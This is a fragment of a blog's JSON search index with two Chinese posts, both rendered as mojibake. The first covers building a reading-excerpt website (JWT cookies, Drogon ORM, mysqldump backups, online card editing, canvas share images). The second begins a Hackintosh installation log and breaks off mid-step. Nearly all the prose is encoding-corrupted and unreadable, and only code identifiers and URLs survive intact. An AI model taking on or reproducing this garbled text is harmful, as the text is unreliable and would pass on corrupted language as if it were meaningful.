å‘èµ·çš„ï¼šå½“ç›´æ¥ä½¿ç”¨æµè§ˆå™¨è®¿é—®æŸä¸ªé¡µé¢æ—¶å‘èµ·çš„GETè¯·æ±‚å°±å¯èƒ½ä¸å¸¦JWTï¼Œå°±å¤±å»äº†ä¸€è‡´æ€§ï¼›å°†JWTæ”¾åˆ°cookieä¸­å¯ä»¥è§£å†³è¿™ä¸€é—®é¢˜ï¼Œå¸¦æ¥çš„CSRFç­‰å®‰å…¨æ€§é—®é¢˜åˆ™éœ€è¦å…¶ä»–åŠæ³•è¿›è¡ŒåŠ å›ºã€‚\næ€¥äºä¸Šçº¿ä½¿ç”¨ï¼Œæ²¡æœ‰æ‰‹æ’¸åŠ å¯†ç®—æ³•ï¼Œå› æ­¤å­¦åˆ°çš„ä¸œè¥¿ä¸å¤šã€‚ ğŸ˜¢\n0x04 æ•°æ®åº“ æ•°æ®åº“ä¹Ÿæ˜¯å¯èƒ½å‡ºç°å®‰å…¨é—®é¢˜çš„ä¸€ä¸ªç‚¹ï¼Œå½“åˆæ„æ€æ—¶è€ƒè™‘äº† åŠ å¯†å­˜å‚¨ ï¼Œåæ¥è§‰å¾—è¿™ç§ç§å¯†æ€§å¾ˆå¼±çš„æ•°æ®åº“æ²¡æœ‰ä»€ä¹ˆåŠ å¯†çš„å¿…è¦ï¼ˆæœ¬æ¥å°±æ˜¯å¸Œæœ›æ‰€æœ‰äººéƒ½èƒ½çœ‹åˆ°æˆ‘æ‘˜æŠ„çš„å†…å®¹ï¼‰ï¼Œå› æ­¤æ”¾å¼ƒäº†åŠ å¯†çš„æƒ³æ³•ã€‚\næ•°æ®åº“æ–¹é¢æœ‰å‡ ä¸ªè¦ç‚¹ï¼š\nä½¿ç”¨äº†Drogonçš„ ORMæ¨¡å‹ ï¼Œå³ï¼ŒDrogonæä¾›çš„å°†æ•°æ®åº“æ“ä½œæŠ½è±¡å‡ºæ¥çš„ä¸€å¥—æ–¹æ³•ï¼›ä½¿ç”¨äº†ORMä¹‹åï¼Œæˆ‘çš„æ“ä½œå°±åªæœ‰ mapper.insert() å’Œ mapper.findAll() äº†ï¼Œåç»­è¦åŠ åŠŸèƒ½çš„è¯å†ç ”ç©¶æ¡ä»¶æŸ¥è¯¢ï¼›\næ•°æ®åº“é‡Œé¢çš„ bookName å’Œ excerpt å­—æ®µæ˜¯éç©ºçš„ï¼Œå³ä¹¦ç±åç§°å’Œæ‘˜æŠ„å†…å®¹æ˜¯éç©ºçš„ï¼ˆä¸ç„¶è¿˜å«ä»€ä¹ˆæ‘˜æŠ„ï¼‰ï¼Œå› æ­¤åœ¨æ”¶åˆ°æ•°æ®çš„æ—¶å€™è¦è¿›è¡Œæ£€æŸ¥ï¼ˆå‰ç«¯ä¹Ÿæ£€æŸ¥äº†ä¸€éï¼Œä½†ä¼—æ‰€å‘¨çŸ¥å‰ç«¯æ£€æŸ¥æ²¡å•¥ç”¨ï¼‰ï¼›\né˜²SQLæ³¨å…¥ï¼é˜²SQLæ³¨å…¥ï¼é˜²SQLæ³¨å…¥ï¼ è¿™ä¸€ç‚¹è¢«ORMæ¨¡å‹æ‰¿åŒ…äº†ï¼Œå¾ˆæå‡å¹¸ç¦æ„Ÿï¼›æœ€åˆçš„æ–¹æ¡ˆæ˜¯è‡ªå·±æ„é€ SQLï¼ŒC++å­—ç¬¦ä¸²è½¬ä¹‰ä»€ä¹ˆçš„ï¼Œæ¯”PHPè¿˜åŸå§‹ï¼Œæ¯”è¾ƒç—›è‹¦ã€‚\nç¾å¤‡ã€‚è€ƒè™‘è¿‡è‹¥å¹²æ–¹æ¡ˆï¼Œæ¯”å¦‚å°†mysqlæ–‡ä»¶åŒæ­¥åˆ°OneDriveå•¥çš„ï¼Œæœ€åå®ç°çš„åŠæ³•æ˜¯æ¯å¤©å®šæ—¶åšä¸€æ¬¡å…¨é‡å¤‡ä»½ï¼Œç”¨ mysqldump æŠŠæ•°æ®åº“å¼„å‡ºæ¥ï¼ŒæŠŠæ•°æ® åŠ å¯†å‹ç¼© ç„¶åè‡ªåŠ¨pushåˆ°Giteeä¸Šã€‚æ›´åŠ ç†æƒ³çš„æ–¹æ¡ˆæ˜¯å…¨é‡å¤‡ä»½ + binlog å¢é‡å¤‡ä»½ï¼Œä½†æ˜¯è€ƒè™‘åˆ°å®ç°èµ·æ¥å¤šä¸€äº›æ­¥éª¤ã€è€Œä¸”æˆ‘çš„æ•°æ®åº“å¾ˆå°ã€å°±æ²¡æœ‰ä½¿ç”¨è¿™ä¸ªæ–¹æ¡ˆã€‚\n0x05 é¡µé¢ä¿®ä¿®è¡¥è¡¥ å‰ç«¯é¡µé¢CSSä¹Ÿæ˜¯å‡ºäº†ä¸€äº›é—®é¢˜çš„ï¼Œæˆ‘æŠŠå‡ ä¸ªæ¯”è¾ƒé‡è¦ï¼ˆä½†ä¸ä¸€å®šå›°éš¾ï¼‰çš„ä¿®è¡¥åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ï¼š\n.content-wrapper ç±»è¦æ·»åŠ  height: 112.5px; å±æ€§ï¼Œä¸ç„¶åœ¨FireFoxå’ŒSafariæµè§ˆå™¨ä¸‹é¢æ’ç‰ˆä¼šé”™ä¹±ï¼Œå…·ä½“è¡¨ç°ä¸º overflow: hidden ä¸èµ·ä½œç”¨ï¼Œè¢«å­å…ƒç´ æ’‘å¼€ï¼‰ï¼›\n.card ç±»è¦æ·»åŠ  white-space: pre-wrap; å±æ€§ï¼Œä¸ç„¶æ¢è¡Œä¼šå˜æˆç©ºæ ¼ï¼›è¯»ä¹¦æ‘˜æŠ„æ²¡æœ‰æ¢è¡Œç®€ç›´æ˜¯å™©æ¢¦ã€‚è¿™é‡Œä¸å¾—ä¸è¯´ä¸€å¥Drogonçš„ORMåšå¾—å¾ˆä¸é”™ï¼ŒæŠŠå‰ç«¯æ–‡æœ¬æ¡†ä¼ æ¥çš„æ¢è¡Œç¬¦å¿ å®åœ°å­˜å…¥æ•°æ®åº“ä¸­äº†ï¼Œçœå´ä¸€å¤§å †äº‹ï¼›\n0x06 å†…å®¹åœ¨çº¿ä¿®æ”¹ 2022-03-09åŠ \nåŸå…ˆå°±æœ‰çš„ä¸€ä¸ªæƒ³æ³•ï¼Œå¸Œæœ›åœ¨ç™»å½•çŠ¶æ€ä¸‹èƒ½å¯¹æµè§ˆçš„å¡ç‰‡è¿›è¡Œåœ¨çº¿ä¿®æ”¹ï¼ˆä¾‹å¦‚å¿ƒè¡€æ¥æ½®åœ°æ·»åŠ ä¸€äº›è¯„è®ºæˆ–è€…çº æ­£ä¸€ä¸‹å½“åˆå½•å…¥çš„é”™åˆ«å­—ç­‰ç­‰ï¼‰ã€‚\nè¿™å—åŠŸèƒ½åœ¨æœ€åˆç¼–å†™å¡ç‰‡ä»£ç çš„æ—¶å€™å°±é¢„ç•™å‡ºæ¥äº†ï¼ŒæŒ‰é’®ä½¿ç”¨çš„æ˜¯Bootstrapæä¾›çš„ä¸‰ä¸ªå›¾æ ‡ï¼Œåˆ†åˆ«è¡¨ç¤ºâ€œå¼€å§‹ç¼–è¾‘â€ã€â€œä¿å­˜ç¼–è¾‘â€ã€â€œå–æ¶ˆç¼–è¾‘â€ã€‚\næŠŠå®ƒä»¬å„è‡ªçš„åŠŸèƒ½ç®€å•å™è¿°ä¸€ä¸‹ã€‚\nå¼€å§‹ç¼–è¾‘ï¼š\nç‚¹å‡»â€œå¼€å§‹ç¼–è¾‘â€ï¼Œå‡ºç°â€œä¿å­˜ç¼–è¾‘â€å’Œâ€œå–æ¶ˆç¼–è¾‘â€æŒ‰é’®ï¼›\nè·å–åŸå¡ç‰‡æ•°æ®ï¼Œå³æŠŠåŸæœ¬çš„ä¹¦ç±åç§°ã€æ‘˜æŠ„å†…å®¹ã€æ–‡ç« æ—¥æœŸç­‰å†…å®¹éƒ½ä¿å­˜åˆ°å…¨å±€å˜é‡é‡Œé¢ï¼Œä»¥ä¾¿åç»­å–æ¶ˆç¼–è¾‘çš„æ—¶å€™æŠŠæ•°æ®æ¢å¤ï¼›\næ›¿æ¢å¡ç‰‡å…ƒç´ ï¼Œå³æŠŠåŸæœ¬çš„ \u0026lt;h4\u0026gt; ã€ \u0026lt;div\u0026gt; ç­‰æ ‡ç­¾æ›¿æ¢ä¸ºå¯ç¼–è¾‘çš„è¾“å…¥æ¡†ï¼Œè¿™ä¸€ç‚¹è·Ÿå‘å¸ƒå†…å®¹çš„æ—¶å€™æ˜¯ä¸€æ ·çš„ï¼Œæ‘˜æŠ„å’Œè¯„è®ºç”¨çš„æ˜¯ textarea è€Œä¹¦ç±åç§°ç­‰ç”¨çš„æ˜¯ input ã€‚è¿™ä¸€æ­¥çš„åšæ³•ç”¨åˆ°äº†jQueryçš„ $(obj).before() å’Œ $(obj).remove() è¿™ä¸¤ä¸ªæ“ä½œï¼Œåˆ†åˆ«æ˜¯æ·»åŠ å…ƒç´ å’Œåˆ é™¤å…ƒç´ ã€‚\nTipsï¼šè¦å¯¹æ·»åŠ çš„ input å’Œ textarea æ·»åŠ  onclick äº‹ä»¶ï¼Œç„¶åä½¿ç”¨ event.stopPropagation() æ¥é˜»æ­¢å†’æ³¡ï¼Œä¸ç„¶ç‚¹å‡»æ–‡æœ¬æ¡†çš„æ—¶å€™ä¼šè§¦å‘å¡ç‰‡çš„å›å¼¹ã€‚\nå–æ¶ˆç¼–è¾‘ï¼š\nä¸â€œå¼€å§‹ç¼–è¾‘â€çš„é€»è¾‘ç›¸åï¼Œç‚¹å‡»åæŠŠæ–‡æœ¬æ¡†æ¢å› \u0026lt;h4\u0026gt; ã€ \u0026lt;div\u0026gt; ç­‰æ ‡ç­¾ï¼Œå¹¶æŠŠä¿å­˜åœ¨å…¨å±€å˜é‡ä¸­çš„åŸæ•°å€¼å¤åŸå›å»ï¼›\næ¢å¤å…ƒç´ è¿™ä¸€ç³»åˆ—æ“ä½œè¦æŠ½å‡ºæ¥å½¢æˆä¸€ä¸ªå•ç‹¬çš„å‡½æ•°ï¼Œåœ¨å¡ç‰‡å›å¼¹çš„æ—¶å€™ä¹Ÿè¦æ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚\nä¿å­˜ç¼–è¾‘ï¼š\nè·å–æ–‡æœ¬æ¡†ä¸­çš„æ•°å€¼ï¼Œç„¶åç”¨axoiså‘é€ç»™åç«¯ï¼›\nDrogonä½¿ç”¨ mapper.update(singleRow) æ¥æ›´æ–°æ•°æ®åº“ï¼›\nå¦‚æœåç«¯æ“ä½œæˆåŠŸï¼Œåˆ™ç¼–è¾‘ä¿å­˜å®Œæ¯•ï¼Œæ›´æ–°å…¨å±€å˜é‡ï¼Œç„¶åæŠŠå¡ç‰‡å¤åŸä¸ºåªè¯»å½¢å¼ï¼›\nå¦‚æœåç«¯æ“ä½œå¤±è´¥ï¼Œ alert() æŠ¥é”™æ¶ˆæ¯ï¼ˆæœ¬æ¥åº”è¯¥è‡ªå·±åšä¸€ä¸ªæ¶ˆæ¯çª—ä½“ä»¥æ”¹å–„ä½“éªŒï¼Œä½†æ˜¯æœ‰ç‚¹æ‡’ï¼Œç›´æ¥Alertäº†ï¼‰ã€‚\nåœ¨çº¿æ›´æ–°åŠŸèƒ½çš„å®ç°ä½¿æ•´ä¸ªç«™ç‚¹çš„æˆç†Ÿåº¦å¾—åˆ°äº†é£è·ƒï¼Œè‡³æ­¤å®ƒå·²ç»è·Ÿä¸€ä¸ªåœ¨çº¿è®°äº‹æœ¬ä¸€æ ·äº†ã€‚æˆ‘å¯ä»¥è‡ªç”±åœ°æ·»åŠ å†…å®¹ã€ä¿®æ”¹å†…å®¹ï¼Œä¸”æ¯å¤©éƒ½æœ‰æ•°æ®åº“çš„å¤‡ä»½ï¼ŒåŸºæœ¬ä¸Šå®Œæˆäº†æœ€åˆé¢„æƒ³çš„åŠŸèƒ½ã€‚\n0x07 å›¾ç‰‡åˆ†äº« å†™äº2022-06-09\næ—¶éš”ä¸‰æœˆï¼Œé‡æ–°æèµ·äº†è¯»ä¹¦æ‘˜æŠ„ç«™ç‚¹~ ğŸ¤”\nè¿™æ¬¡æ·»åŠ çš„æ˜¯æœ€åˆè§„åˆ’æ—¶å°±è€ƒè™‘åˆ°çš„åˆ†äº«åŠŸèƒ½ï¼Œä¹‹å‰ä¸€ç›´æ²¡æœ‰å®ç°ä¸»è¦æ˜¯å› ä¸ºæ‡’ï¼Œä¸”è§‰å¾—è¿™ä¸ªè‡ªå¨±è‡ªä¹çš„ç«™ç‚¹è²Œä¼¼ä¸å¤ªéœ€è¦åˆ†äº«åŠŸèƒ½ï¼›æœ€è¿‘æƒ³è·Ÿæœ‹å‹åˆ†äº«æˆ‘æ‘˜æŠ„çš„ä¸€äº›å¾ˆå¥½çš„ç‰‡æ®µæ—¶ï¼Œæ€»å¾—è‡ªå·±æ‰‹åŠ¨æˆªå›¾ï¼Œæ¯”è¾ƒéš¾å—ï¼›æ›´æœ‰ç”šè€…ï¼Œä¸€äº›æ¯”è¾ƒé•¿çš„ç‰‡æ®µæ²¡æ³•ä¸€æ¬¡æ€§æˆªå–å®Œå…¨ï¼Œäºæ˜¯èŒç”Ÿå‡ºæŠŠåˆ†äº«åŠŸèƒ½å®Œæˆçš„æƒ³æ³•ã€‚\nä¸€ç›´ä»¥æ¥æ¯”è¾ƒå¿ƒæ°´ä¸€é”®ç”Ÿæˆå›¾ç‰‡çš„é‚£ç§åŠŸèƒ½ï¼Œè¿™æ¬¡çš„å¼€å‘å°±ä»¥å›¾ç‰‡åˆ†äº«ä¸ºç›®æ ‡ã€‚\nå›¾ç‰‡åˆ†äº«çš„åŸºæœ¬åŸç†ï¼šä½¿ç”¨HTML canvas ç»˜åˆ¶çŸ¢é‡å›¾ï¼Œä¹‹åå¯ä»¥é€‰æ‹©ä½¿ç”¨ canvas.toDataURL ç”Ÿæˆå›¾ç‰‡URLå¹¶ç”Ÿæˆ img å›¾ç‰‡ï¼Œæˆ–å¯¹ canvas è¿›è¡Œå…¶ä»–æ“ä½œï¼ˆå¦‚å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼‰ã€‚\nå›¾ç‰‡åˆ†äº«çš„å…³é”®æ­¥éª¤æ˜¯å¦‚ä½•å°†è¦åˆ†äº«çš„å†…å®¹ç»˜åˆ¶åˆ° canvas ä¸Šï¼Œè¿™ä¸€æ­¥æœ‰æˆç†Ÿçš„ç¬¬ä¸‰æ–¹å·¥å…· html2canvas ï¼Œå¯ä»¥è‡ªåŠ¨è§£æDOMå…ƒç´ å¹¶ç”Ÿæˆå›¾ç‰‡ï¼Œå—åˆ°ç½‘ä¸Šå„æ•™ç¨‹çš„å¹¿æ³›ä½¿ç”¨ã€‚ä¸è¿‡ï¼Œç»è¿‡æˆ‘çš„æµ‹è¯•ï¼Œè¿™ä¸ªå·¥å…·åœ¨ç»˜åˆ¶æˆ‘çš„æ‘˜æŠ„æ—¶ä¼šä¸¢å¤±ä¸€äº›æ ·å¼ï¼Œè€Œä¸”è¿˜å¾—å»è°ƒè¯•å®ƒçš„å„ç§å‚æ•°ï¼Œå±äºè‡ªè®¨è‹¦åƒï¼Œå¤§å¯ä¸å¿…ã€‚\né‡æ–°æ€è€ƒä¹‹åï¼Œæˆ‘è®¤ä¸ºæˆ‘çš„éœ€æ±‚æ¯”è¾ƒç®€å•ï¼šåªæ˜¯å°†è¦åˆ†äº«çš„ æ–‡å­—å†…å®¹ è½¬æ¢æˆå›¾ç‰‡è€Œå·²ï¼Œæ²¡æœ‰å¤šå°‘éº»çƒ¦çš„æ­¥éª¤ï¼Œå› æ­¤å†³å®šæ‰‹æ’¸ canvas ã€‚\nç”Ÿæˆåˆ†äº«å›¾ç‰‡çš„æ•´ä½“æµç¨‹éå¸¸ç®€å•ï¼š\næµç¨‹ ç”»å¸ƒé•¿å®½æ ¹æ®å±å¹•å¤§å°è€Œæ”¹å˜ï¼Œä½†å§‹ç»ˆä¿æŒä¸€ä¸ªå›ºå®šçš„æ¯”ä¾‹ï¼š\nlet width = $(window).width() * 0.6; let height = $(window).height() * 0.9; ç”»å¸ƒçš„å†…å®¹ç»„ç»‡ç»“æ„ä¹Ÿå¾ˆç®€å•ï¼Œåªæœ‰ä¸‰ä¸ªéƒ¨åˆ†ï¼š\nå†…å®¹ç»“æ„ ä½¿ç”¨ let ctx = canvas.getContext(\u0026quot;2d\u0026quot;); å¾—åˆ°ç”»å¸ƒä¸»ä½“ï¼Œä¹‹åè·å–ç›®æ ‡å†…å®¹è¿›è¡Œç»˜åˆ¶ã€‚\nå¤´éƒ¨å›¾ç‰‡ï¼Œè®¾ç½®å¥½å®½é«˜ï¼Œç„¶å ctx.drawImage(img, 0, 0, width, imgHeight); ã€‚\næ–‡å­—éƒ¨åˆ†ï¼Œè¦å…ˆç»˜åˆ¶ä¸€ä¸ªçŸ©å½¢èƒŒæ™¯ï¼Œå¦åˆ™æ–‡å­—æ²¡æœ‰åº•è‰²ï¼š\nctx.fillStyle = \u0026#34;#ffffff\u0026#34;; ctx.fillRect(0, height * 0.3, width, height); ä½¿ç”¨jQueryæå–è¦åˆ†äº«çš„å†…å®¹ï¼ˆé€šè¿‡DOMæ ‘è·å–ä¹¦ç±åç§°å’Œæ‘˜æŠ„å†…å®¹çš„ç›¸åº”èŠ‚ç‚¹ï¼‰ï¼Œåˆ†åˆ«åœ¨å„è‡ªçš„ä½ç½®ä¸Šç»˜åˆ¶å­—ç¬¦ä¸²ã€‚\n// ç»˜åˆ¶æ–‡å­— ctx.fillStyle = \u0026#34;#000000\u0026#34;; let opt = { \u0026#39;headerHeight\u0026#39;: 0.08 * height, \u0026#39;leftPadding\u0026#39;: 16, \u0026#39;rightPadding\u0026#39;: 5, \u0026#39;bottomPadding\u0026#39;: 16, \u0026#39;textHeight\u0026#39;: 0.6 * height, \u0026#39;textWidth\u0026#39;: width, \u0026#39;maxFontSize\u0026#39;: 20 } // ä¹¦ç±åç§° let fontSize = opt.headerHeight; fontSize = Math.min(fontSize, 24); ctx.font = fontSize.toString() + \u0026#39;px \u0026#39; + \u0026#39;Long Cang\u0026#39;; ctx.fillText(bName.text(), opt.leftPadding, imgHeight + opt.headerHeight * 0.7); // æ‘˜æŠ„å†…å®¹ let text = $(exp).text(); let realTextWidth = opt.textWidth - opt.leftPadding - opt.rightPadding; let realTextHeight = opt.textHeight - opt.bottomPadding; fontSize = Math.floor(Math.sqrt(Math.floor((realTextHeight * realTextWidth) / (2 * text.length)))); fontSize = Math.min(fontSize, opt.maxFontSize); ctx.font = fontSize.toString() + \u0026#39;px \u0026#39; + \u0026#39;Noto Serif SC\u0026#39;; let cols = Math.floor((realTextWidth) / fontSize); let rows = Math.ceil(text.length / cols); for (let i = 0; i \u0026lt; rows; i++) { // æ³¨æ„ substring å’Œ substr ä¸¤ä¸ªä¸åŒAPIçš„åŒºåˆ« ctx.fillText( text.substr(i * cols, cols), opt.leftPadding, imgHeight + opt.headerHeight + fontSize * 2 * (i + 1) ); } è¿™é‡Œä¸ºäº†ä½¿å¾—å¤§æ®µæ–‡å­—èƒ½å¤Ÿå†™å…¥åˆ°ä¸€ä¸ªå›ºå®šé«˜åº¦çš„åŒºåŸŸä¸­ï¼Œéœ€è¦å¯¹ å­—ä½“å¤§å° è¿›è¡Œä¸€äº›æ•°å­¦ä¸Šçš„è®¡ç®—ã€‚\nå·²çŸ¥å¾…å†™å…¥çš„å­—ç¬¦ä¸²ä¸º text ï¼Œç”»å¸ƒæ–‡å­—éƒ¨åˆ†å®½åº¦ä¸º realTextWidth ï¼Œé«˜åº¦ä¸º realTextHeight ï¼Œä»¤å­—ä½“å¤§å°ä¸º fontSize ï¼Œåˆ™\n$$ \\text{åˆ—æ•° }col = \\frac{realTextWidth}{fontSize} $$\n$$ \\text{è¡Œæ•° }row = \\frac{text.length}{col} $$\nä»¤è¡Œé«˜ä¸ºä¸¤å€å­—ä½“å¤§å°ï¼Œå³\n$$ lineHeight = 2 \\times fontSize $$\né‚£ä¹ˆæ–‡å­—éƒ¨åˆ†æ€»å…±éœ€è¦å æ®çš„é«˜åº¦å°±æœ‰\n$$ row \\times lineHeight = \\frac {text.length \\times fontSize}{realTextWidth} \\times fontSize \\times 2 $$\nå®ƒä¸èƒ½è¶…è¿‡ç”»å¸ƒæä¾›çš„é«˜åº¦ï¼Œå¦åˆ™ä¼šæº¢å‡ºï¼Œä¹Ÿå°±æ˜¯éœ€è¦æ»¡è¶³\n$$ \\frac {text.length \\times fontSize}{realTextWidth} \\times fontSize \\times 2 \\leq realTextHeight $$\n$$ \\text{è§£å¾— }fontSize \\leq \\sqrt{\\frac{realTextHeight \\times readTextWidth}{2 \\times text.length}} $$\nè¿™å°±æ˜¯å­—ä½“å¤§å°çš„è¦æ±‚ã€‚æ»¡è¶³è¿™ä¸€å¤§å°è¦æ±‚çš„å­—ä½“æ‰èƒ½å°†ä¸€ä¸ªç‰‡æ®µå®Œæ•´åœ°å†™å…¥ç”»å¸ƒä¸­ã€‚\nå¦ä¸€ä¸ª éœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œ canvas å†™å…¥æ–‡å­—æ—¶ä¸èƒ½è‡ªåŠ¨æ¢è¡Œï¼Œè¶…å‡ºç”»å¸ƒçš„éƒ¨åˆ†å³ä¸å¯è§ã€‚ä¸ºäº†å®ç° æ–‡å­—æ¢è¡Œ çš„æ•ˆæœï¼Œéœ€è¦æ‰‹åŠ¨å¯¹åŸå§‹å­—ç¬¦ä¸²è¿›è¡Œåˆ‡åˆ†ï¼Œæ¯ä¸€æ¬¡åªå†™å…¥åŸå§‹å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼ˆå®é™…ä¸Šå°±æ˜¯å†™å…¥åˆ—æ•° col ä¸ªå­—ç¬¦ï¼‰ï¼Œç§»åŠ¨è‡³ä¸‹ä¸€è¡Œï¼Œå†ç»§ç»­å†™å…¥ï¼Œè¿™å°±æ˜¯ä¸Šæ–¹ä»£ç ä¸­çš„æœ€åä¸€ä¸ª for å¾ªç¯æ‰€åšçš„äº‹æƒ…ã€‚\nå®Œæˆä»¥ä¸Šå‡ ç‚¹ä¹‹åï¼Œèƒ½å¤Ÿç»˜åˆ¶å‡ºä¸€å¼ å¾ˆä¸é”™çš„åˆ†äº«å›¾äº†ï¼š\nåˆ†äº«å›¾ æœ€åï¼Œæ·»åŠ ä¸€ä¸ªæŒ‰é’®ï¼Œç”¨äºå°†è¿™å¼ å›¾ç‰‡ä¸€é”®ä¿å­˜åˆ°å‰ªè´´æ¿ã€‚è¿™é‡Œç»™å‡ºä¸¤ç¯‡é‡è¦å‚è€ƒï¼Œ ç¬¬ä¸€ç¯‡ æ•™ä¼šæˆ‘ä»¬å¦‚ä½•æŠŠ canvas è½¬åŒ–ä¸ºå¯ä»¥å†™å…¥å‰ªè´´æ¿ä¸­çš„æ•°æ®ï¼› ç¬¬äºŒç¯‡ ä»‹ç»äº†æµè§ˆå™¨çš„ navigator.clipboard.write æ¥å£çš„ç”¨æ³•ï¼Œæ®æ­¤ï¼Œå¯ä»¥å®ç°ä¸€é”®å¤åˆ¶å›¾ç‰‡çš„åŠŸèƒ½ã€‚\n0x08 To Do æœ¬æ–‡çš„å™è¿°ç›¸æ¯”ä¹‹å‰çš„ä¸¤ç¯‡ç®€å•å¾ˆå¤šï¼Œå› ä¸ºå†…å®¹å®åœ¨å¤ªå¤šäº†ï¼Œè¯¦å†™ä¸æ¥ ğŸ˜¢\næ•´ä¸ªç«™ç‚¹è¿˜æœ‰ä¸€äº›åœ°æ–¹æ˜¯å¯ä»¥æ”¹è¿›çš„ï¼š\nåˆ†æ®µåŠ è½½ï¼æ¯æ¬¡åªåŠ è½½ä¸€éƒ¨åˆ†è®°å½•ï¼Œæ»‘åŠ¨åˆ°æœ€åº•éƒ¨æ—¶å†ç»§ç»­å‘èµ·è¯·æ±‚ã€‚è¿™ä¸ªåŠŸèƒ½éœ€è¦å‰ç«¯å‘èµ·è¯·æ±‚æ—¶å¸¦ä¸Šä¸€äº›å‚æ•°ï¼Œåç«¯æ•°æ®åº“æŸ¥è¯¢æ—¶ä¹Ÿè¿›è¡Œä¸€äº›ä¿®æ”¹ã€‚\nå¡ç‰‡å‡ºç°çš„åŠ¨ç”»ã€‚è¯•è¯•VUEçš„transitionæ ‡ç­¾ï¼Œæ€»ä¹‹å°±æ˜¯ä½¿å¡ç‰‡å‡ºç°çš„æ—¶å€™ä¸æ»‘ä¸€ç‚¹ã€‚\nå¤§èµ·å§‹é¡µã€‚è®¿é—®å…¶ä»–å¤§ä½¬çš„åšå®¢æ—¶è§‰å¾—ä»–ä»¬çš„é¦–é¡µç¾å›¾å¾ˆä¸é”™ï¼Œæ»šåŠ¨æ»šè½®èƒ½è§¦å‘å…¨å±æ»šåŠ¨å‘ˆç°çœŸæ­£å†…å®¹ï¼Œå¯ä»¥è€ƒè™‘å­¦ä¹ å®ç°ä¸€ä¸‹ã€‚\nå‘å¸ƒ/å±•ç¤ºé¡µé¢å¯¹Markdownè¯­æ³•çš„æ”¯æŒï¼Œä¼¼ä¹ç”¨ä¸€äº›Javascriptåº“å°±å¯å®ç°ã€‚\nâ€¦â€¦\n","date":"2022-03-07T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%AF%BB%E4%B9%A6%E6%91%98%E6%8A%84%E7%AB%99%E7%82%B9%E6%9E%84%E5%BB%BA%E5%89%8D%E5%90%8E%E7%AB%AF%E7%BB%93%E5%90%88/","title":"è¯»ä¹¦æ‘˜æŠ„ç«™ç‚¹æ„å»ºï¼ˆå‰åç«¯ç»“åˆï¼‰"},{"content":"æœ€è¿‘å¤ªé—²ï¼Œæ—¶å¸¸æƒ³ç€æŠŠè€ç”µè„‘é‡è£…ä¸€ä¸‹ï¼Œä¸è¿‡Windowsçš„Cç›˜æ€»æ˜¯è«åå…¶å¦™åœ°æ¸æ¸è·‘æ»¡ï¼Œéå¸¸çƒ¦äººï¼›åŠ ä¹‹ä¸€ç›´ä»¥æ¥å¯¹Mac OSçš„å¥½å¥‡ï¼Œå†³å®šåœ¨è€ç”µè„‘ä¸Šæä¸ªé»‘è‹¹æœï¼ˆHackintoshï¼‰ç©ä¸€ç©ã€‚\né»‘è‹¹æœæŒ‡çš„æ˜¯åœ¨ éAppleè®¾å¤‡ä¸Šè¿è¡ŒMac OS ï¼Œå¯ä»¥ç†è§£ä¸ºåœ¨è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œä¸€ä¸ªç›—ç‰ˆç³»ç»Ÿï¼Œä¸€èˆ¬æ¥è¯´ä¼šå¯¼è‡´å‡ ä¸ªé—®é¢˜ï¼š\nç¡¬ä»¶æ‘†çƒ‚ã€‚å› ä¸ºMacä¸å¯èƒ½é’ˆå¯¹éè‡ªå®¶äº§å“è¿›è¡Œå®Œç¾çš„é€‚é…ï¼›è£…ä¸Šé»‘è‹¹æœä¹‹åï¼Œè¿æ°”ä¸å¥½çš„è¯å¯èƒ½ç½‘å¡ã€USBå£ã€è“ç‰™ç­‰ç­‰éƒ½å¤±æ•ˆï¼› æ— æ³•å¯åŠ¨ã€‚è¿™ä¸ªåŸå› å°±å¾ˆå¤šäº†ï¼Œåº†å¹¸è‡ªå·±æ²¡æœ‰é‡åˆ°ã€‚ æœ¬ç¯‡ä¸»è¦è®°å½•è‡ªå·±çš„Hackintoshä¹‹æ—…ï¼Œç”±äºç¬”è€…ä»æ˜¯åˆå­¦ä¸”å¹¶ä¸è¿½æ±‚å®Œç¾ï¼Œæœ¬æ–‡ä»…ä¾›æ—¥åè‡ªè¡Œç¿»é˜…ï¼Œå¯¹å¤–äººå¹¶æ— å‚è€ƒä»·å€¼ï¼Œç•™æ„ç•™æ„ã€‚\nStep0 Videoæ•™ç¨‹ From YouTubeã€‚è¯·ç§‘å­¦ä¸Šç½‘ ğŸ˜Š\nè¿™ç¯‡æ•™ç¨‹æ˜¯æå…·æŒ‡å¯¼æ„ä¹‰çš„æ•™ç¨‹ï¼ŒæŒ‰ç…§æ•™ç¨‹çš„æŒ‡ç¤ºï¼ŒåŸºæœ¬æ²¡æœ‰å‡ºç°å¤ªå¤šé”™è¯¯ã€‚æ”¾åœ¨é¦–ä½ï¼Œå¹¶ä¸æ˜¯è¯´åªéœ€ç…§ç€æ•™ç¨‹å»åšè€Œå·²ï¼Œè€Œæ˜¯å¯ä»¥å…ˆçœ‹çœ‹æ•™ç¨‹é‡Œé¢çš„å†…å®¹ï¼Œåé¢å†è¿›è¡Œè¯¦ç»†å®šåˆ¶ã€‚\nStep 1 EFI æ•™ç¨‹é‡Œé¢æœ‰ç”¨åˆ°EFIæ–‡ä»¶ã€‚è¿™æ˜¯é»‘è‹¹æœå¯åŠ¨æ—¶éœ€è¦çš„æ–‡ä»¶ï¼Œæ¯ä¸ªæœºå‹çš„å¼•å¯¼æ–‡ä»¶ä¸å°½ç›¸åŒã€‚å¦‚æœEFIä¸åˆé€‚çš„è¯ï¼Œè‡ªç„¶å°±ä¸èƒ½å¯åŠ¨å•¦ï¼\næˆ‘çš„ç”µè„‘æ˜¯ ASUS FL8000UQ ï¼Œä½¿ç”¨äº† https://github.com/alexanderkin/ASUS-FL8000UQ-Hackintosh å¼€æºçš„EFIæ–‡ä»¶ã€‚\nå„æœºå‹å’Œå…¶å¯¹åº”çš„EFIå¯ä»¥ä» https://gitee.com/softxing/Hackintosh æ‰¾åˆ°ã€‚\nStep 2 è§£é”CFG Lock CFG Lockç”¨äºä¿æŠ¤MSR 